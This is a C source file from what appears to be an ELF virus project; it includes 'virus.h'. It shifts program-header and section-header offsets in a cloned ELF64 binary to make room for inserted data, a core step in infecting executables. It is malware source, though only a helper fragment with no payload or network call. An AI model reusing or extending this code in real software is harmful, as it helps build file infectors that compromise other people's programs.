
#include "virus.h"
#include "errors.h"

struct		closure_data
{
	size_t	shift_amount;
	size_t	end_of_last_section;
};

static bool	shift_phdr_position(struct safe_ptr ref, size_t offset, void *data)
{
	struct closure_data	*scope = data;
	Elf64_Phdr		*phdr  = safe(ref, offset, sizeof(Elf64_Phdr));

	if (phdr == NULL) return errors(ERR_FILE, _ERR_F_BAD_PHDR_OFF);

	Elf64_Off	p_offset = phdr->p_offset;

	if (p_offset > scope->end_of_last_section)
	{
		p_offset += scope->shift_amount;
		phdr->p_offset = p_offset;
	}
	return true;
}

static bool	shift_shdr_position(struct safe_ptr ref, size_t offset, void *data)
{
	struct closure_data 	*scope = data;
	Elf64_Shdr		*shdr  = safe(ref, offset, sizeof(Elf64_Shdr));

	if (shdr == NULL) return errors(ERR_FILE, _ERR_F_BAD_SHDR_OFF);

	Elf64_Off	sh_offset = shdr->sh_offset;

	if (sh_offset > scope->end_of_last_section)
	{
		sh_offset += scope->shift_amount;
		shdr->sh_offset = sh_offset;
	}
	return true;
}

static void	adjust_phdr_table_offset(Elf64_Ehdr *safe_elf_hdr, \
			size_t shift_amount, size_t end_of_last_section)
{
	Elf64_Off	e_phoff = safe_elf_hdr->e_phoff;

	if (e_phoff < end_of_last_section)
		return;

	e_phoff += shift_amount;
	safe_elf_hdr->e_phoff = e_phoff;
}

static void	adjust_shdr_table_offset(Elf64_Ehdr *safe_elf_hdr, \
			size_t shift_amount, size_t end_of_last_section)
{
	Elf64_Off	e_shoff = safe_elf_hdr->e_shoff;

	if (e_shoff < end_of_last_section)
		return;

	e_shoff += shift_amount;
	safe_elf_hdr->e_shoff = e_shoff;
}

bool		adjust_references(struct safe_ptr clone_ref, \
			size_t shift_amount, size_t end_of_last_section)
{
	struct closure_data	scope;

	if (shift_amount == 0)
		return true;

	scope.shift_amount        = shift_amount;
	scope.end_of_last_section = end_of_last_section;

	Elf64_Ehdr	*elf_hdr = safe(clone_ref, 0, sizeof(Elf64_Ehdr));

	if (elf_hdr == NULL) return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);

	adjust_phdr_table_offset(elf_hdr, shift_amount, end_of_last_section);
	adjust_shdr_table_offset(elf_hdr, shift_amount, end_of_last_section);

	if (!foreach_phdr(clone_ref, shift_phdr_position, &scope))
		return errors(ERR_THROW, _ERR_T_ADJUST_REFERENCES);
	if (!foreach_shdr(clone_ref, shift_shdr_position, &scope))
		return errors(ERR_THROW, _ERR_T_ADJUST_REFERENCES);

	return true;
}
